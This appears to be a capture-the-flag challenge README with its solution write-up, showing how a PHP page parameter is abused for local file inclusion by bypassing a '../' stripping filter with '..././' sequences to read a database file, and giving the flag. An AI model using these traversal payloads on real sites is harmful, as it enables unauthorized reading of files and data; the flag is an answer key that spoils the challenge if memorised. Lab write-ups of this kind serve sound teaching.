
# Mouse_Hunt

Difficulty Level: Hard

Selling the premium cheeses at the right price to mouse hunters who want to catch the golden mouse. 

Connect at http://web.ctf-fun.xyz:15012/


### Hints

- No hints are provided


## Deployment

Run  sudo ./build.sh in distrib to static file server.

## Solution

Visit the website and inspect the page and them source code.
It looks like it includes php file. This means that we might be able to exploit a LFI (local file inclusion).
/?page=home.php
/?page=about.php
/?page=contact.php
Also after each "cheese" HTML block there is the comment <!-- secret: 0 -->. There might be a secret cheese or something like that.
Let's check if there is a /robots.txt. Yes there is one.
User-agent: *
Disallow: /README.md
Disallow: /LICENSE

Visit /README.md.
There is a lot of information here.
First it gives the location of some sensible files:
●	entry index.php
●	config application/config/config.php
●	database application/database/the-cheese-factory.db
We also know there is $config['secure'] enabled.
Finally the error reporting is not disabled.
Let's finish our recon and visit /LICENSE.
No LICENSE

Ok nothing interesting here.
Now it's time to try exploit the possible LFI.
Let's try to break the page system and display an error message.
http://localhost:12080/?page=foobar
<!-- ... -->
Warning: include(./application/views/foobar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foobar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
It looks like it tries to include the file given by the param page in the directory application/views.
Let's try to include the LICENSE file.
http://localhost:12080/?page=../../LICENSE
<!-- ... -->
Warning: include(./application/views/LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
what the heck? It looks like it striped the ../../.
Let's try with specifying the current directory.
http://localhost:12080/?page=./../../LICENSE
<!-- ... -->
Warning: include(./application/views/./LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/./LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
It looks like it only stripped the ../ from the page param.
Let's try to isolate the behaviour.
http://localhost:12080/?page=foo/../bar
<!-- ... -->
Warning: include(./application/views/foo/bar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foo/bar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
Ok it seem to only replace the ../.
It we want to bypass this system we need to create a page params that we equals to ../../LICENSE after we would remove all ../ from it.
To do it we can insert ../ between each ../.
1.	../../LICENSE
2.	..././../LICENSE (insert ../ at index 1)
3.	..././..././LICENSE (insert ../ at index 7)
http://localhost:12080/?page=..././..././LICENSE
<!-- ... -->
No LICENSE
<!-- ... -->

Yeah!
Now let's read the content of the database.
http://localhost:12080/?page=..././..././application/database/cheese.db
Even if we can't recreate the database from this, the content is still readable.

### Flag
`19C4{local_file_inclusion_is_the_secret_cheese}`
